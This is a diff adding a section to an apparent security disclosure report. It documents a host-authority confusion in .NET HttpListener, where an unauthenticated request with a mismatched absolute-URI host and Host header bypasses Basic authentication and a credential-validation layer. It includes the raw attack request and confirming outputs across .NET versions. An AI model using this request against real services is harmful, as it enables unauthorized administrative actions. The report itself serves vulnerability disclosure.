@@ -493,3 +493,114 @@ The same root cause therefore supports all of the following researcher-controlle
 3. protected admin WebSocket upgraded to 101 without Basic authentication;
 4. bidirectional privileged command accepted over that WebSocket;
 5. concrete filesystem side effect from the synthetic protected operation.
+
+
+## Credential-validation bypass terminal
+
+Clean run:
+
+https://github.com/SamCloudJourney/basic-website/actions/runs/35531683745
+
+This proof specifically addresses the fact that managed HttpListener Basic authentication surfaces the supplied Basic
+identity/password to application code.
+
+A separate researcher-controlled credential-validation layer is added after HttpListener returns a Basic context:
+
+```text
+expected username: research-admin
+expected password: correct-research-password
+```
+
+The protected admin operation is executed only after that validation succeeds for a Basic identity. Anonymous public
+requests intentionally do not enter the Basic credential-validation path because the framework selector classifies
+them as public.
+
+Controls:
+
+```text
+PUBLIC_CONTROL
+  Selected=Anonymous
+  200 OK
+  credentialValidationRan=False
+  adminOperation=False
+
+ADMIN_NO_CREDENTIALS
+  Selected=Basic
+  401 Unauthorized
+  Basic challenge=True
+  context=False
+  adminOperation=False
+
+ADMIN_WRONG_CREDENTIALS
+  Selected=Basic
+  context=True
+  credentialValidationRan=True
+  credentialValidationPassed=False
+  403 Forbidden
+  adminOperation=False
+  sideEffect=False
+
+ADMIN_CORRECT_CREDENTIALS
+  Selected=Basic
+  credentialValidationRan=True
+  credentialValidationPassed=True
+  200 OK
+  adminOperation=True
+  sideEffect=True
+```
+
+Attack, with **no Authorization header**:
+
+```http
+POST http://admin.test:<port>/admin/change HTTP/1.1
+Host: public.test:<port>
+Content-Length: 0
+Connection: close
+```
+
+Managed result:
+
+```text
+Selected=Anonymous
+selectorUserHost=public.test:<port>
+selectorUrlHost=admin.test
+HTTP/1.1 200 OK
+context=True
+userNull=True
+credentialValidationRan=False
+credentialValidationPassed=False
+adminOperation=True
+sideEffect=True
+
+HOST_AUTHORITY_CONFUSION_BYPASSES_CREDENTIAL_VALIDATION=CONFIRMED
+```
+
+Thus the no-credential attack executes an operation that deliberately supplied **wrong Basic credentials cannot
+execute**.
+
+This is confirmed on:
+
+- .NET 8.0.31 / Linux
+- .NET 9.0.20 / Linux
+- .NET 10.0.12 / Linux
+- .NET 10.0.12 / macOS
+- .NET 11.0.0-rc.1 / Linux
+- .NET 11.0.0-rc.1 / macOS
+
+Windows/http.sys on both .NET 10 and .NET 11 RC1 canonicalizes the conflict first:
+
+```text
+Selected=Basic
+401 Unauthorized
+context=False
+adminOperation=False
+sideEffect=False
+
+CREDENTIAL_VALIDATION_WINDOWS_NEGATIVE_CONTROL=PASS
+```
+
+This terminal demonstrates that the authority confusion can bypass not only the framework's Basic challenge but also
+an application credential-validation stage that wrong credentials fail and correct credentials pass.
+
+The proof remains deliberately synthetic: the protected operation creates only a marker in the runner's temporary
+directory.
